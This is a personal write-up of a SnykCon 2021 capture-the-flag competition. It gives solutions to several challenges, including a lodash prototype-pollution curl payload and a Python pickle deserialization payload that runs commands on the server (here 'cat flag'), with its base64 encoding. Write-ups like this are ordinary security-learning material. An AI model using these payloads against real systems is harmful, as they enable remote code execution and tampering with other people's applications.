# SnykCon 2021
I participated in SnykCon 2021 on Oct 5th, 2021 and had a lot of fun! I earned 960 points and placed 140th out of 548 teams.

There were 23 total challenges and I was only able to solve a few for my first go-around. Below are my solutions (or attempts!) for the challenges

## Robert Louis Stevenson - :white_check_mark:
We are given a `docker.tar` image. Open the .tar with a zip manager and navigate to :
```
/./b3b0b5528b213a9d35315784c9907fdeb5d8bf89a0bb012ee63546b3a1c2e10b/layer.tar/ak/pp/tv/bc/22/flag
```

## Invisible Ink - :white_check_mark:
We have the source code for the challenge and lodash 4.17.4 is vulnerable to lodash merge pollution as seen [here](https://github.com/kimmobrunfeldt/lodash-merge-pollution-example)

```bash
curl --location --request POST 'http://35.211.53.53:8000/echo' \
--header 'Content-Type: application/json' \
--data-raw '{"constructor": {"prototype": {"flag": true}}}'
```

## Russian Doll - :x:
Using a caesar cipher from this website shows the key is 11 and the message is :

```bash
The flag is SDZcVdXvZHhKkxopTPYbTvmxTHwFZyyvnutAwsjijXwDqeOg XXTEA encrypted. Password hint: xxxx.
```

I attempted to use python to generate every possible combination of a 4 digit passcode to decrypt however none of them worked.

```python
import xxtea
import random

chrs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0129456789' # Change your required characters here
n = 4 # Change your word length here

num_possibilities = len(chrs) ** n
print('Number of Possibilities: {}'.format(num_possibilities))

encrypted = b"SDZcVdXvZHhKkxopTPYbTvmxTHwFZyyvnutAwsjijXwDqeOg"

for i in range(num_possibilities):
    key = ''.join(random.choice(chrs) for _ in range(n))
    d = xxtea.decrypt(encrypted, key)

    print("Key: {} | Output: {}".format(key, d))

    if d != b'':
        break;
```

## Electronbuzz - :white_check_mark:
I downloaded the MacOS version of the application and then found [this article](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37) on how to get the source code of the app. Once I downloaded the app, I ran the following commands:

```bash
$ cd Documents && mkdir src && cd src
$ npm install -g asar
$ asar extract /Volumes/electronbuzz\ 1.0.0/electronbuzz.app/Contents/Resources/app.asar .
$ code .
```

Inside of the source code, the `challenge.yml` file has a variable named `flags` that contains the flag.

## Sauerkraut - :white_check_mark:

We are presented with a textbox to enter code and get an output. After several trial and errors, I saw errors for base64 and MARK. This lead me to Python's pickle method (which makes sense with the challenge name) and an exploit found [here](https://blog.nelhage.com/2011/03/exploiting-pickle/). I modified the code to instead use `subprocess.check_output` like so:

```python
import pickle
import subprocess
import base64
class RCE:
    def __reduce__(self):
        import os
        return (subprocess.check_output,(['cat', 'flag'],), )

print(base64.b64encode(pickle.dumps(RCE())))

# gASVNAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMA2NhdJSMBGZsYWeUZYWUUpQu
```

First I ran `['ls', '-la']` and saw the flag file, and then used `['cat', 'flag']` Once you paste the above base64 string into the textbox you get the flag.